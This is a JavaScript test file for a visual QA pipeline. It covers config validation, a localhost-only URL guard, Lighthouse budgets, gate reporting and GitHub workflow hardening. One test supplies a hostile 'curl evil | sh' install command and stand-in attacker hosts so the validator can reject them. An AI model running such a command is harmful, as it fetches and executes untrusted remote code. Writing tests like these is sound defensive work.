import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFileSync } from "node:child_process";
import {
  assertVisualConfig,validateVisualConfig,parseLocalBaseURL,routeURL,
  evaluateLighthouse,visualGateSummary,atomicEvidenceOutput
} from "../scripts/visual-qa/contract.mjs";

const file="test/fixtures/visual-qa-site/config.json";
const config=JSON.parse(fs.readFileSync(file,"utf8"));
const clone=structuredClone;

test("strict two-viewport config and working fixture are committed",()=>{
  assert.deepEqual(validateVisualConfig(config),[]);
  assert.equal(assertVisualConfig(config),config);
  assert.deepEqual(config.viewports.map(x=>x.name),["desktop","mobile"]);
  assert.equal(config.routes[0].primaryCtaSelector,"#primary-cta");
  assert.match(fs.readFileSync("test/fixtures/visual-qa-site/index.html","utf8"),/focus-visible/);
  assert.match(fs.readFileSync("test/fixtures/visual-qa-site/index.html","utf8"),/prefers-reduced-motion/);
});

test("unsafe routes, unknown settings, disabled security flags and wrong budgets are rejected",()=>{
  const invalid=clone(config);
  invalid.routes[0].path="//evil.site";
  invalid.routes[0].expectedCtaHref="https://host.example/out";
  invalid.budgets.maxLcpMs=NaN;
  invalid.requireReducedMotion=false;
  invalid.extraInstallCommand="curl evil | sh";
  const errors=validateVisualConfig(invalid).join(" ");
  assert.match(errors,/safe local path/);
  assert.match(errors,/maxLcpMs/);
  assert.match(errors,/requireReducedMotion/);
  assert.match(errors,/unknown field: extraInstallCommand/);
  assert.throws(()=>assertVisualConfig(invalid),/Invalid visual QA config/);
  const x=clone(config);x.viewports[1].name="desktop";
  assert.match(validateVisualConfig(x).join(" "),/unique desktop\/mobile/);
});

test("browser target is restricted to an unprivileged localhost origin",()=>{
  assert.equal(parseLocalBaseURL("http://127.0.0.1:4173/").origin,"http://127.0.0.1:4173");
  assert.equal(routeURL("http://localhost:4173/","/store/demo"),"http://localhost:4173/store/demo");
  for(const url of [
    "https://127.0.0.1:4173/", "http://192.168.1.20:4173/",
    "http://evil.example:4173/", "http://127.0.0.1:22/",
    "http://127.0.0.1:4173/admin?token=x", "http://user@127.0.0.1:4173/",
    "http://localhost:4173/secret"
  ])assert.throws(()=>parseLocalBaseURL(url),/localhost/);
  assert.throws(()=>routeURL("http://127.0.0.1:4173/","//evil.com"),/Unsafe route/);
  assert.throws(()=>routeURL("http://127.0.0.1:4173/","/../secret"),/Unsafe route/);
});

test("Lighthouse gates enforce numeric LCP CLS TBT, fail on missing results",()=>{
  const budgets=config.budgets;
  const sample={audits:{
    "largest-contentful-paint":{numericValue:1200},
    "cumulative-layout-shift":{numericValue:0.01},
    "total-blocking-time":{numericValue:30}
  }};
  assert.equal(evaluateLighthouse(sample,budgets).ok,true);
  assert.equal(evaluateLighthouse(sample,{maxLcpMs:1000,maxCls:0.1,maxTotalBlockingTimeMs:200}).ok,false);
  const incomplete=clone(sample);
  delete incomplete.audits["largest-contentful-paint"];
  assert.match(evaluateLighthouse(incomplete,budgets).errors.join(" "),/missing\/invalid/);
  assert.equal(evaluateLighthouse({},budgets).ok,false);
});

test("missing or skipped gates NEVER become green",()=>{
  const required=["desktop:screenshot","mobile:screenshot","mobile:keyboard","mobile:performance"];
  const incomplete=visualGateSummary({
    "desktop:screenshot":{status:"PASS"},
    "mobile:screenshot":{status:"PASS"},
    "mobile:keyboard":{status:"SKIPPED"}
  },required);
  assert.equal(incomplete.ok,false);
  assert.equal(incomplete.gates["mobile:performance"],"NOT_RUN");
  assert.match(incomplete.errors.join(" "),/NOT_RUN/);
  assert.match(incomplete.errors.join(" "),/SKIPPED/);
  const all=visualGateSummary(Object.fromEntries(required.map(k=>[k,{status:"PASS"}])),required);
  assert.equal(all.ok,true);
});

test("evidence is valid structured artifact and deterministic in a clean folder",t=>{
  const folder=fs.mkdtempSync(path.join(os.tmpdir(),"appfactory-visual-test-"));
  t.after(()=>fs.rmSync(folder,{recursive:true,force:true}));
  const p=atomicEvidenceOutput(folder,{ok:false,reason:"browser not started"});
  assert.equal(path.basename(p),"result.json");
  assert.equal(JSON.parse(fs.readFileSync(p,"utf8")).ok,false);
});

test("workflow is unprivileged, reusable, renders via browser and uploads evidence even on failure",()=>{
  const workflow=fs.readFileSync(".github/workflows/reusable-visual-qa.yml","utf8");
  for(const token of [
    "workflow_call:","appfactory_ref:","config_path:","checkout_ref:",
    "actions/checkout@v4","persist-credentials: false","contents: read",
    "playwright@","@axe-core/playwright@","lighthouse@",
    "node \"$VISUAL_QA_RUNTIME/run.mjs\"",
    "actions/upload-artifact@v4","if: always()",
    "VISUAL_QA_CONFIG","VISUAL_QA_BASE_URL"
  ])assert.ok(workflow.includes(token),token);
  assert.ok(!workflow.includes("pull_request_target:"));
  assert.ok(!workflow.includes("id-token: write"));
  assert.ok(!workflow.includes("secrets: inherit"));
  const runner=fs.readFileSync("scripts/visual-qa/run.mjs","utf8");
  for(const token of [
    "chromium.launch","AxeBuilder","page.screenshot",
    "page.keyboard.press","prefers-reduced-motion: reduce",
    "runLighthouse","evaluateLighthouse","visualGateSummary"
  ])assert.ok(runner.includes(token),token);
});

test("self test is actual reusable workflow call gated by frontend-specific paths",()=>{
  const workflow=fs.readFileSync(".github/workflows/visual-qa-self-test.yml","utf8");
  assert.ok(workflow.includes("reusable-visual-qa.yml"));
  assert.ok(workflow.includes("scripts/visual-qa/**"));
  assert.ok(workflow.includes("test/fixtures/visual-qa-site/config.json"));
  assert.ok(!workflow.includes("pull_request_target:"));
});


test("existing Impact-Aware engine selects visual QA only for frontend changes",async()=>{
  const { analyzeImpact }=await import("../src/impact/engine.mjs");
  const policy=JSON.parse(fs.readFileSync("examples/visual-qa-impact.json","utf8"));
  assert.deepEqual(analyzeImpact(policy,["src/App.tsx"]).gates,["frontend-unit","visual-qa"]);
  assert.deepEqual(analyzeImpact(policy,["api/session.ts"]).gates,["backend-unit"]);
  assert.deepEqual(analyzeImpact(policy,["docs/intro.md"]).gates,[]);
  assert.ok(analyzeImpact(policy,["unknown/new-file.js"]).gates.includes("visual-qa"));
  const example=fs.readFileSync("examples/visual-qa-impact-aware-ci.yml","utf8");
  assert.ok(example.includes("reusable-impact-analysis.yml"));
  assert.ok(example.includes("reusable-visual-qa.yml"));
  assert.ok(example.includes("contains(fromJSON(needs.impact.outputs.gates), 'visual-qa')"));
  assert.ok(example.includes("REVIEWED_IMMUTABLE_SHA"));
  assert.ok(!example.includes("pull_request_target:"));
});
